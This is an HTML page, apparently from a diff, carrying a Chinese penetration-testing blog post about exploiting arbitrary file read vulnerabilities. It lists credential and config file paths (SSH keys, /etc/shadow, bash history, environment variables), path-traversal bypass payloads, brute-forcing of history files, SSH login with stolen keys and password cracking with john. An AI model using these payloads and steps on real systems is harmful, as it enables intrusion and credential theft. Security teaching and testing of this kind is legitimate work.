@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='前言 当我们遇到任意文件读取漏洞的时候，我们需要考虑如何通过这一个小点去扩大我们的成果，达到最大化利用的目的。本篇文章主要介绍了一些在我们拿到任意文件读取点后的深入利用姿势，希望对大家能有所帮助。
+常见读取的敏感文件路径 windows 1 2 3 4 5 6 7 8 C:\boot.ini //查看系统版本 C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件 C:\Windows\repair\sam //存储系统初次安装的密码 C:\Program Files\mysql\my.ini //Mysql配置 C:\Program Files\mysql\data\mysql\user.MYD //Mysql root C:\Windows\php.ini //php配置信息 C:\Windows\my.ini //Mysql配置信息 ...... Linux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 /root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去 /root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub /root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥 /root/.ssh/known_hosts //ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。 /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /etc/my.'>
+<title>文件读取漏洞的后利用知识</title>
+
+<link rel='canonical' href='https://www.zhangyaoke.com/p/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E5%88%A9%E7%94%A8%E7%9F%A5%E8%AF%86/'>
+
+<link rel="stylesheet" href="/scss/style.min.5be32ca3f6e1a997c75795c4359147cc6d4fbd34948c0acd51e31d237033978a.css"><meta property='og:title' content='文件读取漏洞的后利用知识'>
+<meta property='og:description' content='前言 当我们遇到任意文件读取漏洞的时候，我们需要考虑如何通过这一个小点去扩大我们的成果，达到最大化利用的目的。本篇文章主要介绍了一些在我们拿到任意文件读取点后的深入利用姿势，希望对大家能有所帮助。
+常见读取的敏感文件路径 windows 1 2 3 4 5 6 7 8 C:\boot.ini //查看系统版本 C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件 C:\Windows\repair\sam //存储系统初次安装的密码 C:\Program Files\mysql\my.ini //Mysql配置 C:\Program Files\mysql\data\mysql\user.MYD //Mysql root C:\Windows\php.ini //php配置信息 C:\Windows\my.ini //Mysql配置信息 ...... Linux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 /root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去 /root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub /root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥 /root/.ssh/known_hosts //ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。 /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /etc/my.'>
+<meta property='og:url' content='https://www.zhangyaoke.com/p/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E5%88%A9%E7%94%A8%E7%9F%A5%E8%AF%86/'>
+<meta property='og:site_name' content='Tiny Rick Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='渗透测试' /><meta property='article:tag' content='网络安全' /><meta property='article:tag' content='系统配置' /><meta property='article:published_time' content='2021-12-15T23:36:12&#43;08:00'/><meta property='article:modified_time' content='2021-12-15T23:36:12&#43;08:00'/>
+<meta name="twitter:title" content="文件读取漏洞的后利用知识">
+<meta name="twitter:description" content="前言 当我们遇到任意文件读取漏洞的时候，我们需要考虑如何通过这一个小点去扩大我们的成果，达到最大化利用的目的。本篇文章主要介绍了一些在我们拿到任意文件读取点后的深入利用姿势，希望对大家能有所帮助。
+常见读取的敏感文件路径 windows 1 2 3 4 5 6 7 8 C:\boot.ini //查看系统版本 C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件 C:\Windows\repair\sam //存储系统初次安装的密码 C:\Program Files\mysql\my.ini //Mysql配置 C:\Program Files\mysql\data\mysql\user.MYD //Mysql root C:\Windows\php.ini //php配置信息 C:\Windows\my.ini //Mysql配置信息 ...... Linux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 /root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去 /root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub /root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥 /root/.ssh/known_hosts //ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。 /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /etc/my."><style>
+
+    :root {
+        --article-font-family: "Merriweather", var(--base-font-family);
+    }
+</style>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&display=swap";
+    
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+    
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Tiny Rick Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#常见读取的敏感文件路径">常见读取的敏感文件路径</a>
+      <ol>
+        <li><a href="#windows">windows</a></li>
+        <li><a href="#linux">Linux</a></li>
+        <li><a href="#绕过思路">绕过思路</a></li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#用户目录下的敏感文件">用户目录下的敏感文件</a></li>
+        <li><a href="#主机凭证文件">主机凭证文件</a></li>
+      </ol>
+    </li>
+    <li><a href="#全路径">全路径</a></li>
+    <li><a href="#程序源代码">程序源代码</a></li>
+    <li><a href="#应用配置文件">应用配置文件</a></li>
+    <li><a href="#应用日志文件">应用日志文件</a></li>
+  </ol>
+
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#盲读取桌面文件">盲读取桌面文件</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" >
+                渗透测试
+            </a>
+        
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" >
+                网络安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E5%88%A9%E7%94%A8%E7%9F%A5%E8%AF%86/">文件读取漏洞的后利用知识</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Dec 15, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 2 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言</h2>
+<p>当我们遇到任意文件读取漏洞的时候，我们需要考虑如何通过这一个小点去扩大我们的成果，达到最大化利用的目的。本篇文章主要介绍了一些在我们拿到任意文件读取点后的深入利用姿势，希望对大家能有所帮助。</p>
+<h2 id="常见读取的敏感文件路径">常见读取的敏感文件路径</h2>
+<h3 id="windows">windows</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\b</span>oot.ini //查看系统版本
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\i</span>netsrv<span class="se">\M</span>etaBase.xml //IIS配置文件
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\r</span>epair<span class="se">\s</span>am //存储系统初次安装的密码
+</span></span><span class="line"><span class="cl">C:<span class="se">\P</span>rogram Files<span class="se">\m</span>ysql<span class="se">\m</span>y.ini //Mysql配置
+</span></span><span class="line"><span class="cl">C:<span class="se">\P</span>rogram Files<span class="se">\m</span>ysql<span class="se">\d</span>ata<span class="se">\m</span>ysql<span class="se">\u</span>ser.MYD //Mysql root
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\p</span>hp.ini //php配置信息
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\m</span>y.ini //Mysql配置信息
+</span></span><span class="line"><span class="cl">......
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="linux">Linux</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去
+</span></span><span class="line"><span class="cl">/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub
+</span></span><span class="line"><span class="cl">/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥
+</span></span><span class="line"><span class="cl">/root/.ssh/known_hosts
+</span></span><span class="line"><span class="cl">//ssh会把每个访问过计算机的公钥<span class="o">(</span>public key<span class="o">)</span>都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。
+</span></span><span class="line"><span class="cl">/etc/passwd // 账户信息
+</span></span><span class="line"><span class="cl">/etc/shadow // 账户密码文件
+</span></span><span class="line"><span class="cl">/etc/my.cnf //mysql 配置文件
+</span></span><span class="line"><span class="cl">/etc/httpd/conf/httpd.conf // Apache配置文件
+</span></span><span class="line"><span class="cl">/etc/redhat-release 系统版本 
+</span></span><span class="line"><span class="cl">/root/.bash_history //用户历史命令记录文件
+</span></span><span class="line"><span class="cl">/root/.mysql_history //mysql历史命令记录文件
+</span></span><span class="line"><span class="cl">/var/lib/mlocate/mlocate.db //全文件路径
+</span></span><span class="line"><span class="cl">/proc/self/fd/fd<span class="o">[</span>0-9<span class="o">]</span>*<span class="o">(</span>文件标识符<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/proc/mounts //记录系统挂载设备
+</span></span><span class="line"><span class="cl">/porc/config.gz //内核配置文件
+</span></span><span class="line"><span class="cl">/porc/self/cmdline //当前进程的cmdline参数
+</span></span><span class="line"><span class="cl">/proc/sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid
+</span></span><span class="line"><span class="cl">/proc/pid/cmdline   则可以看到对应pid进程的完整命令行。
+</span></span><span class="line"><span class="cl">/proc/net/fib_trie   内网IP
+</span></span><span class="line"><span class="cl">/proc/self/environ   环境变量
+</span></span><span class="line"><span class="cl">/proc/self/loginuid   当前用户
+</span></span><span class="line"><span class="cl">......
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="绕过思路">绕过思路</h3>
+<p>可以进行fuzz</p>
+<ol>
+<li>url编码代替.或者/，如使用%2F代替/
+<code>?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd</code></li>
+<li>二次编码(%25)
+<code>?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd</code></li>
+<li>加入+
+<code>?filename=.+./.+./bin/redacted.dll</code></li>
+<li>%00
+<code>?filename=.%00./file.php</code>
+<code>/etc/passwd%00.jpg</code></li>
+<li><code>\</code>
+<code>?filename=..%5c..%5c/windows/win.ini</code></li>
+<li>Java %c0%ae 安全模式绕过
+<code>?filename=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code></li>
+</ol>
+<h1 id="linux下的常见利用知识">Linux下的常见利用知识</h1>
+<h3 id="用户目录下的敏感文件">用户目录下的敏感文件</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">.bash_history 
+</span></span><span class="line"><span class="cl">.zsh_history
+</span></span><span class="line"><span class="cl">.psql_history
+</span></span><span class="line"><span class="cl">.mysql_history
+</span></span><span class="line"><span class="cl">.profile 
+</span></span><span class="line"><span class="cl">.bashrc
+</span></span><span class="line"><span class="cl">.gitconfig
+</span></span><span class="line"><span class="cl">.viminfo
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">任意文件读取/etc/passwd
+</span></span><span class="line"><span class="cl">提取passwd第一列，即root等一系列用户名
+</span></span><span class="line"><span class="cl">读history：../../root/.bash_history
+</span></span><span class="line"><span class="cl">暴破所有用户的.bash_history：../../../home/§root§/.bash_history
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>历史命令重点关注出现的<code>密码、路径、配置文件路径、其他关联IP、日志文件、war包、备份文件路径</code>等等，可进一步读取或利用。
+PS：如要下载文件，可能会导致过大文件下载失败，可以使用wget进行下载，比如catanlina.out日志文件、war包、备份文件等等。</p>
+<h3 id="主机凭证文件">主机凭证文件</h3>
+<p><strong>私钥文件</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/root/.ssh/id_rsa  私钥
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/root/.ssh/authorized_keys  公钥存储文件
+</span></span><span class="line"><span class="cl">/root/.ssh/id_rsa.keystore
+</span></span><span class="line"><span class="cl">/root/.ssh/known_hosts //记录每个访问计算机用户的公钥
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>私钥文件如果没有设定密码保护，便可直接获取到进行登录到服务器，或使用xshell等软件选择证书登录。
+<code>ssh -i id_rsa root@IP地址</code></p>
+<p><strong>系统密码</strong></p>
+<ul>
+<li><code>/etc/passwd</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">bin:x:1:1:bin:/bin:/sbin/nologin
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到哪些用户可以登录</p>
+<ul>
+<li><code>/etc/shadow</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root:<span class="nv">$1$v2wT9rQF$XSpGgoB93STC4EFSlgpjg1</span>:14181:0:99999:7:::
+</span></span><span class="line"><span class="cl"><span class="nv">$id$salt</span>$密文
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>id代表的是使用不同的加密算法，不同的系统使用的算法也不尽相同。salt是加密的时候需要用到盐。最后就是密文。
+注意：如果密码字符串为*，表示系统用户不能被登入，为!表示用户名被禁用，如果密码字符串为空，表示没有密码。</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th style="text-align:center">格式</th>
+<th style="text-align:center">算法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">$1</td>
+<td style="text-align:center">md5</td>
+</tr>
+<tr>
+<td style="text-align:center">$2a</td>
+<td style="text-align:center">blowfish</td>
+</tr>
+<tr>
+<td style="text-align:center">$2y</td>
+<td style="text-align:center">blowfish</td>
+</tr>
+<tr>
+<td style="text-align:center">$5</td>
+<td style="text-align:center">sha-256</td>
+</tr>
+<tr>
+<td style="text-align:center">$6</td>
+<td style="text-align:center">sha-512</td>
+</tr>
+</tbody>
+</table></div>
+<ul>
+<li>在线查询
+<ul>
+<li><a class="link" href="https://www.cmd5.com/"  target="_blank" rel="noopener"
+    >https://www.cmd5.com/</a></li>
+</ul>
+</li>
+<li>john破解
+<code>unshadow /etc/passwd /etc/shadow &gt; test_passwd</code>
+<code>john --wordlist=字典路径 test_passw</code>
+默认密码字典位于<code>/usr/share/john/password.ls</code></li>
+</ul>
+<h2 id="全路径">全路径</h2>
+<p>mlocate.db数据库里存储了本地所有文件的配置信息
+<code>/var/lib/mlocate/mlocate.db</code>
+利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息
+<code>locate mlocate.db config</code>把包含config的路径全输出出来
+<code>locate mlocate.db webapps</code>
+<code>locate mlocate.db www</code>
+获取到路径后可以进一步挖掘敏感信息和系统漏洞</p>
+<h2 id="程序源代码">程序源代码</h2>
+<p>利用全路径或者其他地方获取到的路径读取一些关键的程序源码。
+读取<code>WEB-INF/web.xml</code>，进一步读取class文件，反编译得到源码。
+读取war包，反编译获取源码。</p>
+<h2 id="应用配置文件">应用配置文件</h2>
+<p>获取到网站的相关配置信息，包括站点配置、数据库配置等等，也可进一步获取到源码。</p>
+<ul>
+<li>java站点
+<code>/WEB-INF/web.xml</code>
+<code>/WEB-INF/classes/applicationContext.xml</code>
+<code>/WEB-INF/classes/xxx/xxx/xxx.class</code>
+<code>core.jar</code>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li>
+<li>tomcat
+<code>/usr/local/tomcat/conf/tomcat-users.xml</code></li>
+<li>nginx
+<code>/www/nginx/conf/nginx.conf</code>
+<code>/etc/nginx/nginx.conf</code>
+<code>/usr/local/nginx/conf/nginx.conf</code>
+<code>/usr/local/etc/nginx/nginx.conf</code></li>
+<li>apache
+<code>/etc/httpd/conf/httpd.conf</code>
+<code>/etc/apache2/apache2.conf</code>
+<code>/etc/apache2/httpd.conf</code></li>
+<li>redis
+<code>/etc/redis.conf</code></li>
+<li>ssh
+<code>/etc/ssh/sshd_config</code></li>
+</ul>
+<h2 id="应用日志文件">应用日志文件</h2>
+<p>利用日志文件获取网站后台地址、api接口、备份、等等敏感信息。</p>
+<ul>
+<li>tomcat
+可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径
+<code>/webapps/ROOT/logs/catalina.out</code></li>
+<li>apache
+<code>/var/log/apache2/access.log</code>
+<code>/var/log/apache2/error.log</code>
+<code>/var/log/httpd/access_log</code>
+<code>/etc/httpd/logs/access_log</code>
+<code>/etc/httpd/logs/error_log</code>
+<code>/etc/httpd/logs/error.log</code></li>
+<li>nginx
+<code>/var/log/nginx/access.log</code>
+<code>/var/log/nginx/error.log</code>
+<code>/usr/local/var/log/nginx/access.log</code>
+<code>/usr/local/nginx/logs</code></li>
+</ul>
+<h1 id="windows下的利用知识">Windows下的利用知识</h1>
+<h3 id="盲读取桌面文件">盲读取桌面文件</h3>
+<p>有些时候，管理员会图方便，在桌面存储一些敏感的文件，我们可以直接对桌面的一些文件名进行fuzz，比如1.txt、2.txt、密码.txt、pass.txt等等，进一步扩大战果。</p>
+<h1 id="总结">总结</h1>
+<p>在漏洞利用层面，除了去关注一键RCE，我们不妨也可以试着去思考一下其他类型漏洞的最大化利用。当一个微小的漏洞和神奇的思路碰撞在一起，往往也能产生意想不到的效果。记住，发散你的思维，让漏洞发挥出最大的价值！</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+        
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+        
+            <a href="/tags/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/">系统配置</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/ctf-misc%E5%B8%B8%E7%94%A8%E8%A7%A3%E9%A2%98%E8%BD%AF%E4%BB%B6/">
+        
+        
+
